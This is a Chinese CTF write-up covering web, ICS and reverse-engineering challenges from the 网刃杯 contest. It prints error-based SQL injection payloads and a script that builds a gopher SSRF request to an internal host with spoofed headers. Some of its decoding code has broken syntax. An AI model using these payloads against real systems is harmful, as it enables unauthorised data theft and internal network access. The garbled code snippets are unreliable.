---
title: 网刃杯部分wp
tags:
 - web
 - PWN
 - ctf
---
## Web部分

### Upload：

![img](/upload/img/clip_image002.gif)

这个题怎么说有点狗，upload但是其实是一个sql注，我尝试上传php

他说type要是ctf，行吧改mini为ctf![img](/upload/img/clip_image004.gif)

上传上去后发现访问他

![img](/upload/img/clip_image006.gif)

既然说SQL就尝试去找注入点

![img](/upload/img/clip_image008.gif)

尝试了很多点，发现就这个地方有报错，那就报错注入' or extractvalue(1,concat(0x7e,database(),0x7e)))#

![img](/upload/img/clip_image010.gif)

尝试爆表半天出不来，平时做题最多的表名就是什么flag，ctf什么的

就直接尝试去爆flag：' or extractvalue(1,concat(0x7e,(select group_concat(flag) from flag),0x7e)))#

![img](/upload/img/clip_image012.gif)

数据不全，用mid爆出来就行

### Sign_in：

这个题打开

![img](/upload/img/clip_image014.gif)

之前又见过一些类似的，链接：[(26条消息) php curl ssrf,ssrf漏洞学习(PHP)_拖狗老师的博客-CSDN博客](https://blog.csdn.net/weixin_29963537/article/details/115813343)

尝试去读取![img](/upload/img/clip_image016.gif)

也没又发现什么有用的借鉴这篇文章

[(26条消息) CTF gopher协议_HyyMbb的博客-CSDN博客_gopher协议](https://blog.csdn.net/a3320315/article/details/102880329?ops_request_misc={"request_id"%3A"165078432816782395313513"%2C"scm"%3A"20140713.130102334.pc_all."}&request_id=165078432816782395313513&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-102880329.142^v9^pc_search_result_cache,157^v4^control&utm_term=gopher协议&spm=1018.2226.3001.4187)

直到读到hosts文件

![img](/upload/img/clip_image018.gif)

发现内网ip

![IMG_256](/upload/img/clip_image020.jpg)

给传入一个a后

![img](/upload/img/clip_image022.gif)

尝试利用fopher写payload

![img](/upload/img/clip_image024.gif)

![img](/upload/img/clip_image026.gif)

加上xff头

![img](/upload/img/clip_image028.gif)

![img](/upload/img/clip_image030.gif)

加上referer头

![img](/upload/img/clip_image032.gif)

最后整个脚本是

```python
import urllib
import urllib.parse
import requests

POST =\
"""POST /index.php?a=1 HTTP/1.1
Host: 172.73.23.100
Content-Type:application/x-www-form-urlencoded
X-Forwarded-For: 127.0.0.1
Referer: bolean.club
Content-Length:1

b=1
"""


tmp = urllib.parse.quote(POST)
new = tmp.replace('%0A','%0D%0A')
result = '_'+new
result=urllib.parse.quote(result)
print('gopher%3A//172.73.23.100%3A80/'+result)
```

 

## ICS的

### Easyiec

这个题就直接以文本的格式打开，然后Ctr+f找到flag

![img](/upload/img/clip_image034.gif)

### Xyp07

这个题开始我还以为是7位文件密码爆破，后来在属性发现了

![img](/upload/img/clip_image036.gif)

对其一直base64解密，得到Xyp77&7&77用wires hark打开

追踪TCP流

![img](/upload/img/clip_image038.gif)

对其进行base91解密

![img](/upload/img/clip_image040.gif)

 
## 逆向的
### freestyle

首先，逆向一般有壳，查一下壳

![img](/upload/img/clip_image042.jpg)

将程序拖入IDA，找到main函数

![img](/upload/img/clip_image044.jpg)

查看fun1()函数

![img](/upload/img/clip_image046.jpg)

![img](/upload/img/clip_image048.jpg)

 

Main.c
```c
#include<stdio.h>

int main()

{

  int i=0;

  for(i=0;i<=1000000000;i++)

  {

  if( 4 * (3 * i / 9 - 9) == 4400)

  printf("%d ",i);

  }

 } 
```

查看fun2() 函数

![img](/upload/img/clip_image050.jpg)

 

![img](/upload/img/clip_image052.jpg)

C：
```c
#include<stdio.h>

  int main()

{

 

  int i=0;

  for(i=0;i<1000;i++)

  if(2*(i%56)== 98)

  printf("%d\n",i);

  return 0;

}
``` 

 

将两个输出拼接可以知道flag原文就是 3327105

将其进行md5 可以得到散列值为 

`31a364d51abd0c8304106c16779d83b1`

加上 flag{}即可

![img](/upload/img/clip_image054.jpg)

 

### Re_function

![img](/upload/img/clip_image056.jpg)

Hex打开，尝试寻找压缩包密码

![img](/upload/img/clip_image058.jpg)

看到PNG图片文件头，可以得知可能是PNG文件，先改成PNG后缀，尝试打开。

![img](/upload/img/clip_image060.jpg)

可以得知密码为3CF8

查壳，发现无壳

![img](/upload/img/clip_image062.jpg)

 

拖入IDA打开，分析

![img](/upload/img/clip_image064.jpg)

看起来没啥有效信息，那就去看另一个ELF文件

![img](/upload/img/clip_image066.jpg)

发现可能是base64的表，可能是基于base64变表编码方式。

用OD打开文件，搜索字符串定位

![img](/upload/img/clip_image068.jpg)

![img](/upload/img/clip_image070.jpg)

得到了flag的长度，为28位。

![img](/upload/img/clip_image072.jpg)

变种方式可能是输入的字符串会隔一位与 0x37 进行异或，那我们可以查看内存，对比一下字符串编码前和编码后的。

![img](/upload/img/clip_image074.jpg)

发现了编码后的字符串

![img](/upload/img/clip_image076.jpg)

运行结果如下：SqcTSxCxSAwHGm/JvxQrvxiNjR9

Main2.c
```c
include<stdio.h>

int main()

{

  int a[]={0x00,0x64,0x71,0x54,0x54,0x64,0x78,0x74,0x78,0x64,0x41,0x40,0x48,0x70,0x6D,0x18,0x4A,0x41,0x78,0x66,0x72,0x41,0x78,0x5E,0x4E,0x5D,0x52,0x0E,0x3D,0x07};

  int i;

  for(i=0;i<28;i++)

  {

​    i=i+1;

​    a[i]=a[i]^0x37;

​    

  }

  for(i=0;i<28;i++)

  printf("%c",a[i]);

  return 0;

}
``` 

 

![img](/upload/img/clip_image078.jpg)

Base64解码一手。

![img](/upload/img/clip_image080.jpg)


 

## ez_algorithm

第一步还是查壳

![img](/upload/img/clip_image082.jpg)

拖入IDA，找到main函数

 

![img](/upload/img/clip_image084.jpg)

查看第一个函数encryption

![img](/upload/img/clip_image086.jpg)

![img](/upload/img/clip_image088.jpg)

可以大致判断是这个函数对输入的字符串进行过滤，将大小写字母所对应下标进行变换后再进入下一个步骤。

![img](/upload/img/clip_image090.jpg)

第二个函数隔离数字，同时对字符进行大小写转换

![img](/upload/img/clip_image092.jpg)

第三个函数

![img](/upload/img/clip_image094.jpg)

![img](/upload/img/clip_image096.jpg)

首先对字母和数字分组，分别操作，但对字母大小写t/t和大小写g/G 单独操作，不区分大小写对不同的字母进行转换

Main.py
```python
a="BRUF{E6oU9Ci#J9+6nWAhwMR9n:}"

b=""

c=""

d="abcdefABCDEF"

e="uvwxyzUVWXYZ"

f="hijklmHIJKLM"

g="nopqrsNOPQRS"

h="qwertyuioplkjhgfdsazxcvbnm"

m="QWERTYUIOPLKJHGFDSAZXCVBNM"

j=""

up="TMQZWKGOIAGLBYHPCRJSUXEVND"

l="ckagevdxizblqnwtmsrpufyhoj"

print(a)

for i in a:

  if(i in d):

​    b+=chr(ord(i)+20)

  elif(i in e):

​    b+=chr(ord(i)-20)

  elif (i in f):

​    b+=chr(ord(i)+6)

  elif (i in g):

​    b+=chr(ord(i)-6)

  elif(i=='t'or i=='T'):

​    b += chr(ord(i) - 13)

  elif(i=='g'or i=='G'):

​    b += chr(ord(i) + 13)

  else:

​    b+=i

print(b)

for i in b:

  if (i in h):

​    c += chr(ord(i) - 32)

  elif(i in m):

​    c += chr(ord(i) + 32)

  else:

​    c+=i

print(c)

for i in range(0,len(c)):

  n=i%4

  if(c[i]in up):

​    if(n==0):

​      j+=chr(65+up.find(c[i]))

​    elif(n==1):

​      j+=chr((up.find(c[i])-n)+65)

​    elif(n==2):

​      j+=chr((up.find(c[i]) *//2)+65)#123*

​    else:

​      j+=chr((up.find(c[i])^n) +65)

  elif(c[i]in l):

​    if(n==0):

​      j+=chr(l.find(c[i])+97)

​    elif(n==1):

​      j+=chr((l.find(c[i]) *//n) +97)*

​    elif(n==2):

​      j+=chr((l.find(c[i])^n) +97)

​    else:

​      j+=chr((l.find(c[i])-n)+97)

  else:

​    j+=c[i]

print(j)
```
 

运行结果如下：

![img](/upload/img/clip_image098.jpg)

很明显flag{w6Lc9mE#t9+6NcrYPti9N:}就是我们想要的，

将+#转化为_ ，:不转化，那么flag如下

flag{w3Lc0mE_t0_3NcrYPti0N:}

 